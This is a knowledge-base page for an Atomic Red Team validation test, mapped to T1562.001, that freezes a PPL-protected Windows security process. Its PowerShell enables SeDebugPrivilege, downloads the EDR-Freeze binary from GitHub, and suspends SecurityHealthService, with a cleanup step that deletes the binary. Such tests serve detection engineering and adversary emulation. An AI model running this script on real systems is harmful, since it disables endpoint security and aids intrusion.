---
atomic_guid: "cbb2573a-a6ad-4c87-aef8-6e175598559b"
title: "Freeze PPL-protected process with EDR-Freeze"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "cbb2573a-a6ad-4c87-aef8-6e175598559b"
  - "Freeze PPL-protected process with EDR-Freeze"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Freeze PPL-protected process with EDR-Freeze

This test utilizes the tool EDR-Freeze, which leverages the native Microsoft binary WerFaultSecure.exe to suspend processes protected by the Protected Process Light mechanism. PPL is a Windows security feature designed to safeguard critical system processes — such as those related to antivirus, credential protection, and system integrity — from tampering or inspection. These processes operate in a restricted environment that prevents access even from administrators or debugging tools, unless the accessing tool is signed and trusted by Microsoft. By using WerFaultSecure.exe, which is inherently trusted by the operating system, EDR-Freeze is able to bypass these restrictions and temporarily freeze PPL-protected processes for analysis or testing purposes.

## Metadata

- Atomic GUID: cbb2573a-a6ad-4c87-aef8-6e175598559b
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Input Arguments

### processName

- description: PPL-protected process name to target
- type: string
- default: SecurityHealthService

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
# Enable SeDebugPrivilege
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class TokenAdjuster {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public long Luid;
        public int Attributes;
    }

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_QUERY = 0x0008;

    public static bool EnableSeDebugPrivilege() {
        IntPtr hToken;
        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
            return false;

        long luid;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
            return false;

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = SE_PRIVILEGE_ENABLED;

        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
"@

$result = [TokenAdjuster]::EnableSeDebugPrivilege()
if ($result) {
    Write-Host "SeDebugPrivilege enabled successfully." -ForegroundColor Green
} else {
    Write-Host "Failed to enable SeDebugPrivilege." -ForegroundColor Red
    exit 1
}

# Get basic process info
$process = Get-Process -Name $#{processName} -ErrorAction Stop
$processName = $process.ProcessName
Write-Host "Process Name: $processName)"
Write-Host "PID: $($process.Id)"
        
# Get executable path and user info
$query = "SELECT * FROM Win32_Process WHERE Name = '$processName.exe'"
$wmiProcess = Get-WmiObject -Query $query

$owner = $wmiProcess.GetOwner()
    Write-Host "User: $($owner.Domain)\$($owner.User)"


# Get the folder of the current script
$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition

# Download latest EDR-Freeze package and extract (force replace)
$downloadUrl = "https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip"
$zipPath = Join-Path $scriptFolder "EDR-Freeze_1.0.zip"
Write-Host "Downloading latest EDR-Freeze from $downloadUrl" -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
    Write-Host "Download completed: $zipPath" -ForegroundColor Green
    $extractFolder = $scriptFolder
    if (Test-Path $zipPath) {
        Write-Host "Extracting archive to $extractFolder (overwriting existing files)" -ForegroundColor Cyan
        if (Test-Path $extractFolder) {
            # Ensure target exe not locked; attempt to stop any running instance silently
            Get-Process -Name "EDR-Freeze_1.0" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        }
        Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null
        # Custom extraction routine (overwrite existing) compatible with .NET Framework (no bool overwrite overload)
        $archive = $null
        try {
            $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
            foreach ($entry in $archive.Entries) {
                if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue }
                if ($entry.FullName.EndsWith('/')) { # directory entry
                    $dirPath = Join-Path $extractFolder $entry.FullName
                    if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null }
                    continue
                }
                $destPath = Join-Path $extractFolder $entry.FullName
                $destDir = Split-Path $destPath -Parent
                if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
                if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue }
                try {
                    # Use static extension method (PowerShell 5.1 compatible)
                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)
                } catch {
                    Write-Host "Failed to extract entry $($entry.FullName): $_" -ForegroundColor Yellow
                }
            }
            Write-Host "Extraction completed." -ForegroundColor Green
        } finally {
            if ($archive) { $archive.Dispose() }
        }
    }
} catch {
    Write-Host "Failed to download or extract EDR-Freeze: $_" -ForegroundColor Red
}

# Wait 15s before putting targeted process before putting it in the comma
Write-Host "Waiting 15s before putting $processName in the comma" -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host "Waiting 10s before putting $processName in the comma" -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host "Waiting 5s before putting $processName in the comma" -ForegroundColor Yellow
Start-Sleep -Seconds 3
Write-Host "Waiting 2s before putting $processName in the comma" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# Put targeted  process in the comma for 15s
# Discover the EDR-Freeze executable dynamically (pick most recent if multiple)
$edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 1 -ExpandProperty Name
if (-not $edrFreezeExeName) {
    Write-Host "No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder" -ForegroundColor Red
    exit 1
}

$edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName
Write-Host "Using EDR-Freeze executable: $edrFreezeExeName" -ForegroundColor Cyan
Write-Host "$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)" -ForegroundColor Yellow
Start-Process -FilePath $edrFreezeExe -ArgumentList ("$($process.Id) 15000") | Out-Null
```

### Cleanup

```powershell
Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue
Write-Output "File deleted: $edrFreezeExe"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
